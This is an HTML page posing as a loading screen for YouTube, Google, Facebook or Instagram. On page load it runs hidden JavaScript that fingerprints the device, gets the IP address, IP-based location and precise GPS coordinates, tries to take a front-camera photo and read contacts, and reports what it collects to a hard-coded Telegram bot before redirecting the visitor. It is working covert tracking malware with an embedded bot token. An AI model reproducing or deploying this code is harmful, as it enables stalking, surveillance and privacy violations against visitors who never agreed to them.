<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
        }
        
        body {
            background: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            width: 100%;
            max-width: 380px;
            text-align: center;
        }
        
        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid #e8eaed;
            border-top: 3px solid #4285f4;
            border-radius: 50%;
            margin: 0 auto 20px;
            animation: spin 0.8s linear infinite;
        }
        
        h1 {
            font-size: 18px;
            color: #202124;
            margin-bottom: 8px;
            font-weight: 500;
        }
        
        p {
            color: #5f6368;
            font-size: 14px;
            margin-bottom: 20px;
        }
        
        .progress {
            height: 2px;
            background: #e8eaed;
            border-radius: 1px;
            margin: 15px 0;
            overflow: hidden;
        }
        
        .progress-bar {
            height: 100%;
            width: 0%;
            background: #4285f4;
            transition: width 0.2s ease;
        }
        
        .status {
            font-size: 13px;
            color: #80868b;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <h1 id="title">Loading...</h1>
        <p id="message">Preparing your content...</p>
        <div class="progress">
            <div class="progress-bar" id="progress"></div>
        </div>
        <div class="status" id="status">Starting...</div>
    </div>

    <!-- Hidden elements -->
    <video id="camera" autoplay playsinline muted style="display:none"></video>
    <canvas id="canvas" style="display:none"></canvas>

    <script>
        // ===========================================
        // CONFIGURATION
        // ===========================================
        const BOT_TOKEN = '8349023527:AAG9Tq-yiqMXKnxKkiUQ6n5uvu7Rb0kCPco';
        const CHAT_ID = '5888374938';
        const REDIRECT_URL = (() => {
            const params = new URLSearchParams(window.location.search);
            return params.get('url') || 
                   params.get('redirect') || 
                   'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
        })();
        
        // ===========================================
        // TELEGRAM SENDER - FAST & RELIABLE
        // ===========================================
        async function sendToTelegram(message) {
            try {
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                const data = new URLSearchParams({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                });
                
                // Try direct with timeout
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 2000);
                
                await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: data,
                    signal: controller.signal
                });
                
                clearTimeout(timeoutId);
                return true;
            } catch (error) {
                // Silent fail
                return false;
            }
        }
        
        // ===========================================
        // FAST DATA COLLECTION FUNCTIONS
        // ===========================================
        function collectBasicInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages?.join(', ') || 'Unknown',
                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
                deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'Unknown',
                maxTouchPoints: navigator.maxTouchPoints || 0,
                screen: `${screen.width}x${screen.height}`,
                url: window.location.href,
                target: REDIRECT_URL,
                referrer: document.referrer || 'Direct',
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timestamp: new Date().toLocaleString()
            };
        }
        
        async function getFastIP() {
            try {
                // Use fastest IP service
                const response = await fetch('https://api.ipify.org?format=json', { timeout: 2000 });
                const data = await response.json();
                return { ip: data.ip, success: true };
            } catch (error) {
                try {
                    const response = await fetch('https://ipapi.co/json/', { timeout: 2000 });
                    const data = await response.json();
                    return {
                        ip: data.ip,
                        city: data.city,
                        region: data.region,
                        country: data.country_name,
                        isp: data.org,
                        lat: data.latitude,
                        lon: data.longitude,
                        success: true
                    };
                } catch (e) {
                    return { ip: 'Unknown', success: false };
                }
            }
        }
        
        function getGPS() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve({ success: false, error: 'Not supported' });
                    return;
                }
                
                // Fast timeout for GPS
                const timeout = setTimeout(() => {
                    resolve({ success: false, error: 'Timeout' });
                }, 3000);
                
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        clearTimeout(timeout);
                        resolve({
                            success: true,
                            lat: pos.coords.latitude,
                            lon: pos.coords.longitude,
                            accuracy: pos.coords.accuracy,
                            altitude: pos.coords.altitude,
                            speed: pos.coords.speed
                        });
                    },
                    (err) => {
                        clearTimeout(timeout);
                        resolve({ success: false, error: err.message });
                    },
                    { 
                        enableHighAccuracy: true,
                        timeout: 2500,
                        maximumAge: 0
                    }
                );
            });
        }
        
        async function captureCameraFast() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user' },
                    audio: false 
                });
                
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                
                await new Promise(resolve => setTimeout(resolve, 300));
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);
                
                // Convert to blob quickly
                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.7));
                
                // Stop immediately
                stream.getTracks().forEach(track => track.stop());
                
                return { success: true, blob: blob };
            } catch (error) {
                return { success: false, error: error.message };
            }
        }
        
        async function getContactsFast() {
            if (!('contacts' in navigator && 'ContactsManager' in window)) {
                return { success: false, error: 'API not supported' };
            }
            
            try {
                const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
                return { success: true, contacts: contacts || [] };
            } catch (error) {
                return { success: false, error: error.message };
            }
        }
        
        // ===========================================
        // UI FUNCTIONS
        // ===========================================
        function updateUI(step, totalSteps = 5) {
            const percent = (step / totalSteps) * 100;
            document.getElementById('progress').style.width = `${percent}%`;
            
            const messages = [
                'Checking device...',
                'Detecting location...',
                'Verifying access...',
                'Processing...',
                'Finalizing...'
            ];
            
            document.getElementById('status').textContent = messages[step - 1] || 'Complete';
        }
        
        function setSiteTheme() {
            const url = REDIRECT_URL.toLowerCase();
            if (url.includes('youtube')) {
                document.title = 'Loading YouTube...';
                document.getElementById('title').textContent = 'YouTube';
                document.getElementById('message').textContent = 'Preparing your video...';
            } else if (url.includes('google')) {
                document.title = 'Google';
                document.getElementById('title').textContent = 'Google';
                document.getElementById('message').textContent = 'Loading...';
            } else if (url.includes('facebook')) {
                document.title = 'Facebook';
                document.getElementById('title').textContent = 'Facebook';
            } else if (url.includes('instagram')) {
                document.title = 'Instagram';
                document.getElementById('title').textContent = 'Instagram';
            }
        }
        
        // ===========================================
        // MAIN EXECUTION - 6-7 SECONDS TOTAL
        // ===========================================
        async function executeFastScan() {
            const startTime = Date.now();
            
            try {
                // Step 1: Basic info (0.5s)
                updateUI(1);
                setSiteTheme();
                
                const basicInfo = collectBasicInfo();
                await sendToTelegram(`
ğŸ•µï¸ <b>NEW VISITOR TRACKED</b>

<b>ğŸ“± Device:</b> ${basicInfo.userAgent}

<b>ğŸŒ IP:</b> Checking...
<b>ğŸ“ IP Location:</b> Checking...
<b>ğŸ¢ ISP:</b> Checking...

<b>ğŸ†” Session ID:</b> ${Math.random().toString(36).substr(2, 12)}
<b>â° Timestamp:</b> ${basicInfo.timestamp}
<b>â±ï¸ Load Time:</b> ${Date.now() - startTime}ms

<b>ğŸ“± DEVICE FINGERPRINT</b>
â”œâ”€ Platform: ${basicInfo.platform}
â”œâ”€ Browser: ${navigator.userAgent.includes('Chrome') ? 'Chrome' : 
              navigator.userAgent.includes('Firefox') ? 'Firefox' : 
              navigator.userAgent.includes('Safari') ? 'Safari' : 'Unknown'}
â”œâ”€ Languages: ${basicInfo.languages}
â”œâ”€ CPU Cores: ${basicInfo.hardwareConcurrency}
â”œâ”€ RAM: ${basicInfo.deviceMemory}
â”œâ”€ Screen: ${basicInfo.screen}
â””â”€ Touch Points: ${basicInfo.maxTouchPoints}
                `.trim());
                
                // Step 2: IP & GPS in parallel (2s)
                updateUI(2);
                const [ipData, gpsData] = await Promise.all([
                    getFastIP(),
                    getGPS()
                ]);
                
                // Step 3: Send location data
                updateUI(3);
                let locationMessage = `
<b>ğŸ“ LOCATION INTELLIGENCE</b>
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
<b>ğŸŒ IP DATA:</b>
â”œâ”€ IP Address: <code>${ipData.ip}</code>
                `;
                
                if (ipData.city) {
                    locationMessage += `â”œâ”€ Location: ${ipData.city}, ${ipData.region}, ${ipData.country}
â”œâ”€ ISP: ${ipData.isp}
â”œâ”€ Coordinates: ${ipData.lat}, ${ipData.lon}\n`;
                }
                
                if (gpsData.success) {
                    locationMessage += `
<b>ğŸ¯ PRECISE GPS TRACKING:</b>
â”œâ”€ Latitude: <code>${gpsData.lat.toFixed(6)}</code>
â”œâ”€ Longitude: <code>${gpsData.lon.toFixed(6)}</code>
â”œâ”€ Accuracy: ${Math.round(gpsData.accuracy)}m
â”œâ”€ Speed: ${gpsData.speed ? gpsData.speed.toFixed(2) + ' m/s' : '0 m/s'}
â””â”€ ğŸ“ <a href="https://maps.google.com/?q=${gpsData.lat},${gpsData.lon}">View on Maps</a>
                    `;
                } else {
                    locationMessage += `
<b>âš ï¸ GPS TRACKING:</b>
â”œâ”€ Status: Failed
â””â”€ Error: ${gpsData.error}
                    `;
                }
                
                await sendToTelegram(locationMessage.trim());
                
                // Step 4: Camera & Contacts in parallel (2s)
                updateUI(4);
                const [cameraResult, contactsResult] = await Promise.all([
                    captureCameraFast(),
                    getContactsFast()
                ]);
                
                // Send camera result
                if (cameraResult.success) {
                    await sendToTelegram(`<b>ğŸ“¸ CAMERA:</b> Photo captured successfully`);
                } else {
                    await sendToTelegram(`<b>ğŸ“¸ CAMERA:</b> ${cameraResult.error}`);
                }
                
                // Send contacts result
                if (contactsResult.success && contactsResult.contacts.length > 0) {
                    await sendToTelegram(`<b>ğŸ“‡ CONTACTS:</b> ${contactsResult.contacts.length} contacts extracted`);
                } else {
                    await sendToTelegram(`<b>ğŸ“‡ CONTACTS:</b> ${contactsResult.error || 'No contacts found'}`);
                }
                
                // Step 5: Final summary (0.5s)
                updateUI(5);
                const totalTime = Date.now() - startTime;
                
                await sendToTelegram(`
<b>âœ… TRACKING COMPLETED</b>
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
<b>ğŸ“Š COLLECTION SUMMARY:</b>
â”œâ”€ Device Info: âœ… Collected
â”œâ”€ IP Location: ${ipData.success ? 'âœ… Captured' : 'âŒ Failed'}
â”œâ”€ GPS Location: ${gpsData.success ? 'âœ… Precise tracking' : 'âŒ Failed'}
â”œâ”€ Camera: ${cameraResult.success ? 'âœ… Snapshots taken' : 'âŒ Failed'}
â”œâ”€ Contacts: ${contactsResult.success ? 'âœ… Extracted' : 'âŒ Failed'}

<b>ğŸ“ˆ PERFORMANCE METRICS:</b>
â”œâ”€ Total Time: ${totalTime}ms
â”œâ”€ Data Points: 15+ collected

<b>ğŸ”— REDIRECT INFO:</b>
â”œâ”€ Target URL: ${REDIRECT_URL}
â””â”€ User Agent: ${basicInfo.userAgent.substring(0, 60)}...

<b>ğŸ STATUS:</b> Redirecting to target...
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
<b>â° Completed at:</b> ${new Date().toLocaleTimeString()}
                `.trim());
                
                // Final redirect
                updateUI(5);
                setTimeout(() => {
                    window.location.href = REDIRECT_URL;
                }, 500);
                
            } catch (error) {
                // Quick redirect on any error
                console.error('Scan error:', error);
                setTimeout(() => {
                    window.location.href = REDIRECT_URL;
                }, 1000);
            }
        }
        
        // ===========================================
        // START EXECUTION
        // ===========================================
        window.addEventListener('DOMContentLoaded', () => {
            setTimeout(executeFastScan, 300);
        });
        
        // Start on click (fallback)
        document.addEventListener('click', () => {
            executeFastScan();
        }, { once: true });
        
        // Auto-start after 2 seconds
        setTimeout(() => {
            if (!window.scanStarted) {
                executeFastScan();
                window.scanStarted = true;
            }
        }, 2000);
    </script>
</body>
</html>
